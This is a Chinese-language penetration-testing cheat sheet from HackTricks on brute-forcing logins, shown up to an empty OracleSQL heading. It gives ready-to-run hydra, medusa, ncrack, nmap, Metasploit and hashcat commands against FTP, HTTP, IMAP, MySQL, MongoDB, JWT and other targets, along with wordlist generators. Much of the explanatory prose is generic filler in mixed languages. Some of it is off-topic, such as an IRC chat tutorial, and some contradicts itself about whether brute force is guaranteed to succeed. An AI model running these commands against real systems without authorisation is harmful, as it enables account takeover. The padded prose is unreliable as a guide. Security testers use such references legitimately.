# 暴力破解 - 速查表

![](<../.gitbook/assets/image (9) (1) (2).png>)

\
使用[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)轻松构建和自动化由全球**最先进**的社区工具提供支持的工作流程。\
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)或**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。

</details>

## 默认凭据

在谷歌中搜索正在使用的技术的默认凭据，或者尝试以下链接：

* [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
* [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
* [**http://www.vulnerabilityassessment.co.uk/passwordsC.htm**](http://www.vulnerabilityassessment.co.uk/passwordsC.htm)
* [**https://192-168-1-1ip.mobi/default-router-passwords-list/**](https://192-168-1-1ip.mobi/default-router-passwords-list/)
* [**https://datarecovery.com/rd/default-passwords/**](https://datarecovery.com/rd/default-passwords/)
* [**https://bizuns.com/default-passwords-list**](https://bizuns.com/default-passwords-list)
* [**https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv**](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://www.cirt.net/passwords**](https://www.cirt.net/passwords)
* [**http://www.passwordsdatabase.com/**](http://www.passwordsdatabase.com)
* [**https://many-passwords.github.io/**](https://many-passwords.github.io)
* [**https://theinfocentric.com/**](https://theinfocentric.com/)

## **创建自己的字典**

尽可能多地了解目标，并生成自定义字典。可能有用的工具：

### Crunch
```bash
crunch 4 6 0123456789ABCDEF -o crunch1.txt #From length 4 to 6 using that alphabet
crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using charset mixalpha (inside file charset.lst)

@ Lower case alpha characters
, Upper case alpha characters
% Numeric characters
^ Special characters including spac
crunch 6 8 -t ,@@^^%%
```
### Cewl

Cewl is a tool used for generating custom wordlists by scraping websites or documents. It can be helpful in performing brute force attacks by creating wordlists based on the target's specific interests or characteristics.

To use Cewl, you need to provide it with a target URL or a file to scrape. It will then analyze the content and extract relevant words, such as names, email addresses, or keywords. These words are then combined to create a custom wordlist that can be used in brute force attacks.

Cewl offers various options to customize the wordlist generation process. For example, you can specify the minimum and maximum length of the words, exclude certain words or characters, and even use regular expressions to filter the extracted words.

By using Cewl to generate targeted wordlists, you can increase the chances of success in brute force attacks. Instead of using generic wordlists, which may contain irrelevant or less likely passwords, you can create wordlists that are tailored to the target's preferences, making the attack more efficient and effective.

Remember to always use Cewl responsibly and with proper authorization.
```bash
cewl example.com -m 5 -w words.txt
```
### [CUPP](https://github.com/Mebus/cupp)

根据你对受害者的了解（姓名、日期等）生成密码
```
python3 cupp.py -h
```
### [Wister](https://github.com/cycurity/wister)

Wister是一个字典生成工具，允许您提供一组单词，从给定的单词中创建多个变体，从而创建一个针对特定目标的独特和理想的字典。
```bash
python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst

__          _______  _____ _______ ______ _____
\ \        / /_   _|/ ____|__   __|  ____|  __ \
\ \  /\  / /  | | | (___    | |  | |__  | |__) |
\ \/  \/ /   | |  \___ \   | |  |  __| |  _  /
\  /\  /   _| |_ ____) |  | |  | |____| | \ \
\/  \/   |_____|_____/   |_|  |______|_|  \_\

Version 1.0.3                    Cycurity

Generating wordlist...
[########################################] 100%
Generated 67885 lines.

Finished in 0.920s.
```
### [pydictor](https://github.com/LandGrey/pydictor)

### 字典列表

* [**https://github.com/danielmiessler/SecLists**](https://github.com/danielmiessler/SecLists)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://github.com/kaonashi-passwords/Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi)
* [**https://github.com/google/fuzzing/tree/master/dictionaries**](https://github.com/google/fuzzing/tree/master/dictionaries)
* [**https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm**](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)
* [**https://weakpass.com/wordlist/**](https://weakpass.com/wordlist/)
* [**https://wordlists.assetnote.io/**](https://wordlists.assetnote.io/)
* [**https://github.com/fssecur3/fuzzlists**](https://github.com/fssecur3/fuzzlists)
* [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
* [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)

![](<../.gitbook/assets/image (9) (1) (2).png>)

\
使用[**Trickest**](https://trickest.io/)可以轻松构建和自动化由全球最先进的社区工具提供支持的工作流程。\
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## 服务

按服务名称按字母顺序排列。

### AFP
```bash
nmap -p 548 --script afp-brute <IP>
msf> use auxiliary/scanner/afp/afp_login
msf> set BLANK_PASSWORDS true
msf> set USER_AS_PASS true
msf> set PASS_FILE <PATH_PASSWDS>
msf> set USER_FILE <PATH_USERS>
msf> run
```
### AJP

AJP (Apache JServ Protocol) 是一种用于在 Apache Web 服务器和 Tomcat 应用服务器之间进行通信的协议。它允许 Apache 作为反向代理将请求转发给 Tomcat。然而，如果未正确配置和保护 AJP，攻击者可能会利用它进行暴力破解攻击。

#### AJP 暴力破解攻击

AJP 暴力破解攻击是一种尝试通过连续尝试多个可能的用户名和密码组合来获取未授权访问的攻击方法。攻击者可以使用工具自动化这个过程，例如 Hydra 或 Burp Suite 的 Intruder 功能。

以下是进行 AJP 暴力破解攻击的一般步骤：

1. 确定目标：确定目标服务器上是否存在 AJP 协议，并确定其端口号。
2. 枚举用户名：使用字典或其他方法枚举可能的用户名。
3. 枚举密码：使用字典或其他方法枚举可能的密码。
4. 进行暴力破解：使用工具自动化尝试所有可能的用户名和密码组合。
5. 分析结果：分析工具的输出，查看是否成功破解了目标服务器的凭据。

为了防止 AJP 暴力破解攻击，可以采取以下措施：

- 禁用或限制 AJP 协议的使用，除非确实需要使用它。
- 配置 AJP 时使用安全的认证机制，例如使用 SSL/TLS 加密通信。
- 使用强密码策略，并定期更改密码。
- 监控日志以检测暴力破解尝试，并采取适当的响应措施。

请注意，进行未经授权的暴力破解攻击是非法的，并且可能会导致严重的法律后果。只能在合法的渗透测试活动中使用这些技术。
```bash
nmap --script ajp-brute -p 8009 <IP>
```
### Cassandra

Cassandra是一个开源的分布式NoSQL数据库系统，它被设计用于处理大规模的数据集。它具有高度可扩展性和高性能的特点，适用于需要处理大量数据的应用程序。

#### 基本概念

- **节点（Node）**：Cassandra集群中的每个服务器都被称为节点。每个节点都可以独立地处理读写请求，并且都存储了部分数据。

- **键空间（Keyspace）**：键空间是Cassandra中数据的逻辑容器。它类似于传统数据库中的数据库，用于组织和管理数据。

- **列族（Column Family）**：列族是Cassandra中数据的基本单元。它类似于传统数据库中的表，用于存储具有相同结构的数据。

- **列（Column）**：列是Cassandra中数据的最小单元。它由列名、值和时间戳组成。

#### Brute Force攻击

Brute Force攻击是一种基于暴力破解的攻击方法，通过尝试所有可能的组合来破解密码或者破解加密算法。在Cassandra中，Brute Force攻击可以用于尝试破解用户的密码或者破解密钥。

以下是一些常见的Brute Force攻击方法：

- **字典攻击**：使用预先准备好的密码字典来尝试破解密码。这种方法依赖于用户使用弱密码的倾向。

- **暴力破解**：通过尝试所有可能的密码组合来破解密码。这种方法非常耗时，但是可以保证破解成功。

- **彩虹表攻击**：使用预先计算好的彩虹表来破解密码。彩虹表是一种特殊的数据结构，用于加速密码破解过程。

为了防止Brute Force攻击，Cassandra提供了一些安全措施，如密码策略、登录尝试限制和IP白名单等。管理员应该合理配置这些安全措施，以保护Cassandra集群的安全性。
```bash
nmap --script cassandra-brute -p 9160 <IP>
```
### CouchDB

CouchDB是一个开源的面向文档的NoSQL数据库，它使用JSON格式存储数据。它具有分布式、可扩展和高可用性的特点。CouchDB使用B树索引来加快查询速度，并支持复制和同步功能，使得数据在多个节点之间进行复制和同步变得容易。CouchDB还提供了一个简单的RESTful API，使得与数据库进行交互变得简单和灵活。

#### Brute Force攻击

Brute Force攻击是一种基于暴力破解的攻击方法，它尝试使用所有可能的组合来破解密码或访问受保护的资源。在CouchDB中，Brute Force攻击可以用于尝试猜测管理员密码或用户密码，以获取未经授权的访问权限。

为了防止Brute Force攻击，CouchDB提供了一些安全措施。其中之一是设置密码策略，包括密码长度、复杂性要求和密码重用限制。此外，CouchDB还提供了登录失败限制功能，可以限制在一定时间内登录失败的次数，从而防止暴力破解攻击。

然而，即使CouchDB采取了这些安全措施，仍然有可能通过Brute Force攻击来破解密码。因此，为了保护CouchDB免受此类攻击，建议采取其他安全措施，如使用强密码、启用两步验证和限制登录IP等。
```bash
msf> use auxiliary/scanner/couchdb/couchdb_login
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /
```
### Docker Registry

Docker Registry是一个用于存储和分发Docker镜像的开源服务。它允许用户将自己的镜像上传到Registry，并与其他用户共享。Docker Registry提供了一个RESTful API，可以通过HTTP请求来管理镜像。

#### 常见的Docker Registry

- Docker Hub：Docker官方提供的公共Registry，包含了大量的官方和社区维护的镜像。
- Amazon Elastic Container Registry (ECR)：AWS提供的托管式Registry，用于存储和管理Docker镜像。
- Google Container Registry (GCR)：Google Cloud提供的托管式Registry，用于存储和管理Docker镜像。
- Azure Container Registry (ACR)：Microsoft Azure提供的托管式Registry，用于存储和管理Docker镜像。

#### 暴力破解Docker Registry

暴力破解是一种尝试猜测用户名和密码的攻击方法。对于Docker Registry来说，暴力破解可以用于尝试猜测Registry的管理员账户或其他用户账户的密码。

以下是一些常见的暴力破解方法：

1. 字典攻击：使用一个包含常见密码的字典文件，逐个尝试每个密码。
2. 暴力破解工具：使用专门设计的暴力破解工具，如Hydra或Medusa，来自动化尝试不同的用户名和密码组合。
3. 社交工程学：通过获取目标用户的个人信息，如生日、宠物名等，来猜测密码。

为了防止暴力破解攻击，建议采取以下措施：

- 使用强密码：使用包含大小写字母、数字和特殊字符的复杂密码。
- 多因素身份验证：启用多因素身份验证，以增加账户的安全性。
- IP限制：限制只有特定IP地址可以访问Registry。
- 定期更改密码：定期更改密码，以防止密码被猜测或泄露。

请注意，暴力破解是一种非法行为，仅在合法授权的情况下进行。
```
hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/
```
### Elasticsearch

Elasticsearch是一个开源的分布式搜索和分析引擎，用于处理大规模数据集。它使用基于Lucene的搜索引擎来提供快速和高效的搜索功能。Elasticsearch还具有强大的聚合功能，可以对数据进行复杂的分析和统计。

#### 弱密码攻击

弱密码攻击是一种常见的入侵技术，用于尝试破解使用弱密码保护的系统。对于Elasticsearch来说，弱密码攻击可以通过使用常见的用户名和密码组合，或者使用密码破解工具来进行。

以下是一些常见的弱密码攻击方法：

- 字典攻击：使用预先准备好的密码字典来尝试破解密码。
- 暴力破解：尝试使用所有可能的密码组合来破解密码。
- 常见密码攻击：使用常见的密码列表来尝试破解密码。

#### 防御措施

为了防止弱密码攻击，以下是一些建议的防御措施：

- 使用强密码：确保密码足够复杂，包含字母、数字和特殊字符，并且长度足够长。
- 多因素身份验证：启用多因素身份验证，以增加登录的安全性。
- 锁定账户：在一定的登录尝试失败次数后，锁定账户一段时间，以防止暴力破解攻击。
- 定期更改密码：定期更改密码，以防止密码泄露后被滥用。

#### 总结

弱密码攻击是一种常见的入侵技术，可以通过尝试破解使用弱密码保护的系统来获取未授权访问。为了防止弱密码攻击，应该使用强密码、启用多因素身份验证、锁定账户和定期更改密码。
```
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 9200 http-get /
```
### FTP

FTP（文件传输协议）是一种用于在计算机之间传输文件的协议。它允许用户通过网络连接到远程计算机，并在计算机之间传输文件。

#### 暴力破解FTP密码

暴力破解是一种尝试所有可能的密码组合来破解目标系统的方法。对于FTP密码的暴力破解，攻击者会使用一个密码字典，其中包含常见的密码和可能的变体。攻击者将尝试使用字典中的每个密码来登录FTP服务器，直到找到正确的密码为止。

以下是暴力破解FTP密码的一般步骤：

1. 收集目标信息：获取目标FTP服务器的IP地址、端口号和登录凭据（如果有）。
2. 准备密码字典：创建一个包含常见密码和可能的变体的密码字典。
3. 使用暴力破解工具：使用暴力破解工具，如Hydra或Medusa，将密码字典与目标FTP服务器进行配对，并尝试登录。
4. 分析结果：分析工具的输出，查看是否找到了正确的密码。
5. 访问FTP服务器：使用找到的密码登录FTP服务器，并访问其中的文件。

请注意，暴力破解是一种耗时且不保证成功的方法。在实施暴力破解之前，请确保您有合法的授权，并遵守适用的法律和道德准则。
```bash
hydra -l root -P passwords.txt [-t 32] <IP> ftp
ncrack -p 21 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
```
### HTTP通用暴力破解

#### [**WFuzz**](../pentesting-web/web-tool-wfuzz.md)

### HTTP基本身份验证
```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/
# Use https-get mode for https
medusa -h <IP> -u <username> -P  <passwords.txt> -M  http -m DIR:/path/to/auth -T 10
```
### HTTP - 提交表单

To perform a brute force attack on a login form that uses the HTTP POST method, you need to follow these steps:

1. Identify the target login form: Inspect the HTML source code of the login page to find the form element that contains the username and password fields.

2. Prepare a wordlist: Create a text file with a list of possible usernames and passwords. You can use common wordlists or create your own based on the target's characteristics.

3. Use a tool or script to automate the attack: There are several tools available that can automate the process of sending POST requests with different username and password combinations. Some popular tools include Hydra, Medusa, and Burp Suite.

4. Configure the tool: Set the target URL, specify the username and password fields, and provide the wordlist file.

5. Start the brute force attack: Run the tool and let it iterate through the wordlist, sending POST requests with different combinations of usernames and passwords.

6. Analyze the responses: Pay attention to the responses received from the server. A successful login attempt will typically result in a different response than a failed attempt. This can help you identify valid credentials.

7. Monitor for account lockouts: Some websites have mechanisms in place to prevent brute force attacks by locking out an account after a certain number of failed login attempts. Monitor for any account lockouts to avoid detection.

8. Adjust the attack parameters: If the initial brute force attempt is unsuccessful, you can modify the wordlist, try different combinations, or adjust the tool's settings to increase the chances of success.

Remember that brute forcing is a time-consuming process and may be detected by intrusion detection systems or trigger account lockouts. Use it responsibly and with proper authorization.
```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
# Use https-post-form mode for https
```
对于http**s**，你需要将 "http-post-form" 改为 "**https-post-form**"

### **HTTP - CMS --** (W)ordpress, (J)oomla or (D)rupal or (M)oodle
```bash
cmsmap -f W/J/D/M -u a -p a https://wordpress.com
```
### IMAP

IMAP（Internet Mail Access Protocol）是一种用于接收电子邮件的协议。它允许用户通过电子邮件客户端从邮件服务器上下载邮件。IMAP与POP3类似，但具有更多的功能和灵活性。

#### IMAP暴力破解

IMAP暴力破解是一种攻击技术，通过尝试多个用户名和密码组合来破解IMAP账户的登录凭据。攻击者可以使用自动化工具来自动化这个过程，以快速地尝试大量的凭据组合。

以下是一些常用的IMAP暴力破解工具：

- Hydra：一个强大的网络登录破解工具，支持多种协议，包括IMAP。
- Medusa：一个快速、可靠的网络登录破解工具，也支持IMAP协议。
- Ncrack：一款高度可配置的网络认证破解工具，支持多种协议，包括IMAP。

IMAP暴力破解是一种常见的攻击技术，但它可能会受到账户锁定、IP封锁和其他安全措施的限制。因此，在进行IMAP暴力破解之前，攻击者应该评估目标系统的安全性，并采取适当的防范措施来减轻风险。
```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> imap -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f <IP> imap -V
nmap -sV --script imap-brute -p <PORT> <IP>
```
### IRC

IRC（Internet Relay Chat）是一种实时的互联网聊天协议。它允许用户通过IRC客户端在各种主题的聊天室中进行交流。IRC是一种非常古老的协议，但仍然被广泛使用。

#### 基本概念

- **IRC服务器**：提供IRC服务的计算机。
- **IRC客户端**：用于连接到IRC服务器的应用程序或工具。
- **IRC聊天室**：由主题或兴趣组织的虚拟聊天室，用户可以在其中交流。
- **IRC频道**：在IRC聊天室中的特定讨论区域。
- **IRC操作员**：负责管理IRC服务器和聊天室的用户。

#### 连接到IRC服务器

要连接到IRC服务器，您需要使用IRC客户端。以下是一些常用的IRC客户端：

- **mIRC**：适用于Windows的流行IRC客户端。
- **HexChat**：适用于Windows和Linux的免费IRC客户端。
- **Irssi**：适用于Linux和Unix的命令行IRC客户端。

#### IRC聊天室和频道

一旦连接到IRC服务器，您可以加入不同的聊天室和频道。要加入聊天室，您需要知道聊天室的名称。例如，要加入名为“#hackers”的聊天室，您可以使用以下命令：

```
/join #hackers
```

一旦加入聊天室，您可以在其中与其他用户进行交流。要加入聊天室中的特定频道，您可以使用以下命令：

```
/join #hackers-101
```

#### IRC命令

IRC客户端支持各种命令，用于与IRC服务器和其他用户进行交互。以下是一些常用的IRC命令：

- **/join**：加入聊天室或频道。
- **/part**：离开聊天室或频道。
- **/nick**：更改您的昵称。
- **/msg**：向其他用户发送私人消息。
- **/whois**：获取有关其他用户的信息。
- **/list**：列出可用的聊天室。

#### IRC安全性

由于IRC是一个开放的协议，因此存在一些安全风险。以下是一些保护您的IRC会话的建议：

- 使用SSL或TLS加密连接到IRC服务器。
- 不要在IRC上共享敏感信息。
- 谨慎点击通过IRC发送的链接。
- 避免下载通过IRC发送的文件。

#### 总结

IRC是一种实时的互联网聊天协议，允许用户在聊天室中进行交流。通过使用IRC客户端，您可以连接到IRC服务器并加入不同的聊天室和频道。请注意保护您的IRC会话以确保安全性。
```bash
nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p <PORT> <IP>
```
### ISCSI

iSCSI（Internet Small Computer System Interface）是一种用于在IP网络上传输SCSI命令的协议。它允许计算机通过网络连接到远程存储设备，就像它们直接连接到本地存储设备一样。iSCSI使用TCP/IP协议来提供远程存储访问，并通过将SCSI命令封装在TCP/IP数据包中来实现。

iSCSI的工作原理是将SCSI命令从主机发送到远程存储设备，然后将响应从存储设备发送回主机。这种远程存储访问的方式使得主机可以利用远程存储设备的容量和性能，而无需直接连接到它们。

iSCSI的安全性可以通过使用IPsec或SSL/TLS等加密协议来增强。这些协议可以确保数据在传输过程中的机密性和完整性。

在渗透测试中，可以使用iSCSI协议进行暴力破解攻击。暴力破解是一种尝试使用各种可能的密码组合来破解目标系统的方法。对于iSCSI，可以使用暴力破解工具来尝试猜测iSCSI目标的用户名和密码，以获取对远程存储设备的访问权限。

暴力破解攻击是一种常见的攻击方法，因此在使用iSCSI协议时，应采取适当的安全措施来防止此类攻击。这包括使用强密码、启用账户锁定机制、限制登录尝试次数等。
```bash
nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 3260 <IP>
```
### JWT

JSON Web Token（JWT）是一种用于在网络应用之间传递信息的开放标准（RFC 7519）。它使用JSON对象作为安全令牌，以便在发送方和接收方之间传递声明。JWT通常用于身份验证和授权。它由三个部分组成：头部，载荷和签名。

#### 头部（Header）

头部通常由两部分组成：令牌的类型（即JWT）和所使用的签名算法（例如HMAC SHA256或RSA）。头部以Base64编码的形式出现。

#### 载荷（Payload）

载荷包含声明，声明是关于实体（通常是用户）和其他数据的声明。有三种类型的声明：注册声明，公共声明和私有声明。载荷以Base64编码的形式出现。

#### 签名（Signature）

签名是使用头部和载荷中的数据以及一个密钥生成的哈希值。它用于验证消息的完整性和身份验证。签名通常使用密钥（对称加密）或私钥（非对称加密）生成。

#### 使用JWT进行暴力破解

暴力破解是一种尝试所有可能的组合来破解密码或令牌的方法。对于JWT，暴力破解可以尝试不同的载荷和签名组合，以找到有效的令牌。这可以通过编写脚本或使用专门的工具来实现。

#### 防御措施

为了防止JWT被暴力破解，可以采取以下措施：

- 使用强密码：选择一个强密码作为密钥，以增加破解的难度。
- 使用长密钥：使用更长的密钥长度，增加破解的复杂性。
- 限制尝试次数：限制尝试次数，例如通过实施登录锁定机制或增加延迟时间。
- 使用JWT库：使用受信任的JWT库，以确保实现的安全性和正确性。

#### 结论

JWT是一种常用的身份验证和授权机制，但它也可能受到暴力破解的威胁。通过采取适当的防御措施，可以增加JWT的安全性，从而保护应用程序和用户的数据。
```bash
#hashcat
hashcat -m 16500 -a 0 jwt.txt .\wordlists\rockyou.txt

#https://github.com/Sjord/jwtcrack
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#John
john jwt.txt --wordlist=wordlists.txt --format=HMAC-SHA256

#https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py -d wordlists.txt <JWT token>

#https://github.com/brendan-rius/c-jwt-cracker
./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc 1234567890 8

#https://github.com/mazen160/jwt-pwn
python3 jwt-cracker.py -jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc -w wordlist.txt

#https://github.com/lmammino/jwt-cracker
jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ" "abcdefghijklmnopqrstuwxyz" 6
```
### LDAP

LDAP（轻量级目录访问协议）是一种用于访问和维护分布式目录服务的协议。它允许客户端通过网络连接到目录服务器，并执行各种操作，如搜索、添加、修改和删除目录条目。

LDAP暴力破解是一种攻击技术，通过尝试多个可能的用户名和密码组合来破解LDAP身份验证。这种攻击方法通常用于获取未经授权的访问权限，从而获取目录中的敏感信息。

以下是一些常用的LDAP暴力破解工具和技术：

- Hydra：一种流行的暴力破解工具，可用于破解LDAP身份验证。
- Medusa：另一种功能强大的暴力破解工具，支持多种协议，包括LDAP。
- 字典攻击：使用预先生成的密码列表进行暴力破解尝试。
- 基于规则的攻击：使用规则和模式生成密码组合，以增加破解成功的几率。

在执行LDAP暴力破解时，需要注意以下几点：

- 使用强密码：使用复杂、随机和长密码可以增加破解的难度。
- 锁定策略：实施锁定策略，限制登录尝试次数，以防止暴力破解攻击。
- 监控日志：监控LDAP服务器的登录日志，及时发现和应对暴力破解攻击。

请注意，暴力破解是一种非法活动，仅限于合法的渗透测试和授权的安全审计。在进行任何形式的攻击之前，请确保获得适当的授权和法律许可。
```bash
nmap --script ldap-brute -p 389 <IP>
```
### MQTT

MQTT（Message Queuing Telemetry Transport）是一种轻量级的消息传输协议，通常用于物联网设备之间的通信。它基于发布-订阅模式，允许设备通过中间代理（broker）进行消息的发布和订阅。

#### Brute Force

暴力破解是一种常见的攻击技术，用于尝试猜测密码或凭据。对于MQTT，暴力破解可以用于尝试猜测设备的用户名和密码，以获取未经授权的访问权限。

以下是一些常见的MQTT暴力破解方法：

1. 字典攻击：使用预先准备好的密码字典尝试猜测密码。这种方法依赖于设备使用弱密码或常见密码的可能性。

2. 暴力破解工具：使用专门设计的暴力破解工具，如Hydra或Medusa，对MQTT进行暴力破解。这些工具可以自动化猜测用户名和密码的过程，并尝试多种组合。

为了防止MQTT暴力破解攻击，建议采取以下措施：

1. 使用强密码：确保设备使用强密码，包括字母、数字和特殊字符的组合。避免使用常见密码或默认密码。

2. 限制登录尝试次数：通过设置登录尝试次数限制，可以防止攻击者使用暴力破解工具进行大量的尝试。

3. 使用安全认证机制：使用TLS/SSL等安全认证机制，加密MQTT通信，防止密码被窃取。

4. IP过滤：限制允许连接到MQTT代理的IP地址，只允许受信任的设备进行连接。

5. 监控和日志记录：定期监控MQTT代理的登录活动，并记录登录尝试和失败的登录。这样可以及时发现暴力破解攻击，并采取相应的措施。

请注意，暴力破解是一种非法行为，在未经授权的情况下使用暴力破解工具进行攻击是违法的。本书仅提供有关暴力破解的信息，以帮助安全专业人员了解和防范此类攻击。
```
ncrack mqtt://127.0.0.1 --user test –P /root/Desktop/pass.txt -v
```
### Mongo

Mongo是一个流行的NoSQL数据库，它使用文档模型来存储数据。在渗透测试中，Brute Force攻击是一种常见的方法，用于尝试猜测Mongo数据库的凭据并获取未授权访问。

#### 基本原理

Brute Force攻击的基本原理是通过尝试所有可能的组合来猜测凭据。对于Mongo数据库，这意味着尝试不同的用户名和密码组合，直到找到正确的凭据为止。

#### 工具和技术

以下是一些常用的工具和技术，可用于执行Mongo数据库的Brute Force攻击：

- Hydra：一种强大的网络登录破解工具，可用于尝试不同的用户名和密码组合。
- Nmap：一种网络扫描工具，可用于发现Mongo数据库的开放端口。
- Metasploit：一种渗透测试框架，提供了用于执行Brute Force攻击的模块。

#### 实施步骤

以下是执行Mongo数据库Brute Force攻击的一般步骤：

1. 使用Nmap扫描目标网络，以查找开放的Mongo数据库端口。
2. 使用Hydra工具尝试不同的用户名和密码组合，直到找到正确的凭据。
3. 如果Hydra无法成功破解凭据，可以尝试使用Metasploit框架中的模块执行Brute Force攻击。

#### 防御措施

为了防止Mongo数据库的Brute Force攻击，可以采取以下措施：

- 使用强密码：确保Mongo数据库的凭据使用强密码，包括字母、数字和特殊字符的组合。
- 实施账户锁定：在一定的失败尝试次数后，暂时锁定账户，以防止连续的Brute Force攻击。
- 使用IP白名单：限制只有特定IP地址可以访问Mongo数据库，以减少未授权访问的风险。

#### 结论

Mongo数据库的Brute Force攻击是一种常见的渗透测试方法，用于尝试猜测凭据并获取未授权访问。通过使用适当的工具和技术，以及采取适当的防御措施，可以减少Mongo数据库的Brute Force攻击的风险。
```bash
nmap -sV --script mongodb-brute -n -p 27017 <IP>
use auxiliary/scanner/mongodb/mongodb_login
```
### MySQL

MySQL是一种流行的关系型数据库管理系统，常用于Web应用程序和其他数据驱动的应用程序中。MySQL使用SQL语言进行查询和管理数据。

#### 暴力破解MySQL密码

暴力破解是一种尝试所有可能的密码组合来破解目标系统的方法。以下是一些常用的暴力破解MySQL密码的方法：

1. 字典攻击：使用预先准备好的密码字典来尝试破解密码。这些字典通常包含常见的密码和常用的单词组合。

2. 暴力破解工具：使用专门设计的暴力破解工具，如Hydra或Medusa，来自动化密码破解过程。这些工具可以通过尝试不同的密码组合来快速破解密码。

3. 弱密码检测：使用密码强度分析工具，如John the Ripper或Hashcat，来检测弱密码。这些工具可以分析密码的强度，并提供改进密码安全性的建议。

#### 防御暴力破解

为了防止暴力破解攻击，可以采取以下措施：

1. 强密码策略：使用复杂的密码，并定期更改密码。密码应包含大小写字母、数字和特殊字符，并且不应与个人信息相关联。

2. 账户锁定：在一定的失败尝试次数后，锁定账户一段时间，以防止暴力破解攻击。

3. 使用双因素身份验证：通过使用双因素身份验证，如短信验证码或硬件令牌，增加账户的安全性。

4. IP限制：限制允许访问MySQL服务器的IP地址范围，以防止未经授权的访问。

5. 定期更新和维护：及时安装MySQL的安全补丁，并定期审查和更新数据库的安全设置。

请注意，暴力破解是一种非法行为，在未经授权的情况下使用这些技术可能会导致法律后果。
```bash
# hydra
hydra -L usernames.txt -P pass.txt <IP> mysql

# msfconsole
msf> use auxiliary/scanner/mysql/mysql_login; set VERBOSE false

# medusa
medusa -h <IP/Host> -u <username> -P <password_list> <-f | to stop medusa on first success attempt> -t <threads> -M mysql
```
### OracleSQL

